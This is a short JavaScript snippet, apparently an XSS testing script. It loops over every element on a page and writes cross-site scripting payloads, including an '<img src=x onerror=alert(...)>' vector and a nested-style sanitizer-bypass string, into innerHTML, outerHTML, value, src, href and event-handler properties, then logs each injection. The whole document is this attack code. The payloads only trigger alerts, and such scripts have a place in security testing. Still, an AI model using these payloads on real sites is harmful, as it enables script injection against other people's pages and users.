Array.from(document.querySelectorAll('*')).forEach(el => { ['innerHTML', 'outerHTML', 'innerText', 'value', 'src', 'href', 'onerror', 'onload'].forEach(attr => { try { el[attr] = `<img src=x onerror=alert('XSS')>` } catch(e) {} }) });
const inertPayload = `<div><style><style/><img src=x onerror="alert(1337)"/></div>`;
Array.from(document.querySelectorAll('*')).forEach(el => { 
    ['innerHTML', 'outerHTML', 'innerText', 'value', 'src', 'href', 'onerror', 'onload'].forEach(attr => { 
        try { 
            el[attr] = inertPayload; 
            console.log(`Injected into ${el.tagName}.${attr}`); 
        } catch(e) {
            console.log(`Failed to inject into ${el.tagName}.${attr}: ${e.message}`);
        } 
    }) 
});
